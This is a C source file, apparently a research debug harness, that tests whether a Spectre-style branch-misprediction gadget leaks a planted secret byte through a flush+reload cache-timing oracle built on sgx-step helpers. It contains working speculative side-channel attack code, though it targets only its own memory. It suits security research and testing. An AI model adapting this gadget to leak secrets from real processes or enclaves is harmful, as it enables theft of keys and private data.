/*
 * GGSEC modifications and additions:
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 */
/* Debug: does the gate-based misprediction actually touch the oracle?
 * Prints the per-class reload latency for a known secret (class 42) under:
 *   (1) architectural attack  (gate=0, branch really taken)   -- controls decode/oracle
 *   (2) mispredicted attack   (gate=1 flushed)                 -- the real gadget
 * If (1) shows class 42 hot but (2) does not, the misprediction isn't leaking.
 * Build: gcc -O2 -I$HOME/sgx-step mp-debug.c -o mp-debug   Run: ./mp-debug
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <sys/mman.h>
#include "libsgxstep/cache.h"

#define SLOT 0x1040
#define NCLS 64
#define BOUND 1
#define TRAIN 32

char __attribute__((aligned(0x1000))) oracle[SLOT * NCLS];
char __attribute__((aligned(0x1000))) scratch[SLOT * NCLS];
volatile long gate;
void *volatile ptr;
char *volatile base;

static void __attribute__((noinline)) gadget(void)
{
    if (gate < BOUND) {
        unsigned v = *(volatile unsigned char *) ptr;
        maccess(base + (size_t)(v & 0x3f) * SLOT);
    }
}

static void leak(void *attack_ptr, void *dummy, long attack_gate)
{
    for (int t = 0; t < TRAIN; t++) { gate = 0; ptr = dummy; base = scratch; gadget(); }
    ptr = attack_ptr; base = oracle;
    gate = attack_gate;
    flush((void *) &gate);
    asm volatile("mfence" ::: "memory");
    for (volatile int z = 0; z < 100; z++) { }
    gadget();
}

static void run(const char *tag, long attack_gate, unsigned char *secret, unsigned char *dummy, int iters)
{
    static double avg[NCLS];
    for (int c = 0; c < NCLS; c++) avg[c] = 0;
    for (int r = 0; r < iters; r++) {
        for (int c = 0; c < NCLS; c++) flush(oracle + (size_t) c * SLOT);
        leak(secret, dummy, attack_gate);
        for (int c = 0; c < NCLS; c++) avg[c] += (double) reload(oracle + (size_t) c * SLOT);
    }
    printf("== %s (secret class 42, %d iters) ==\n", tag, iters);
    for (int c = 0; c < NCLS; c++) {
        printf(" c%02d=%4.0f%s", c, avg[c] / iters, c == 42 ? "<42" : "");
        if ((c & 7) == 7) printf("\n");
    }
}

int main(void)
{
    cpu_set_t s; CPU_ZERO(&s); CPU_SET(1, &s);
    if (sched_setaffinity(0, sizeof(s), &s) != 0) { CPU_ZERO(&s); CPU_SET(0, &s); sched_setaffinity(0, sizeof(s), &s); }

    unsigned char *page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    unsigned char *secret = page + 0xfc0; *secret = 0x2a;  /* class 42 */
    static unsigned char dummy = 0;

    run("(1) ARCHITECTURAL attack gate=0", 0, secret, &dummy, 2000);
    run("(2) MISPREDICTED  attack gate=1", BOUND, secret, &dummy, 2000);
    return 0;
}
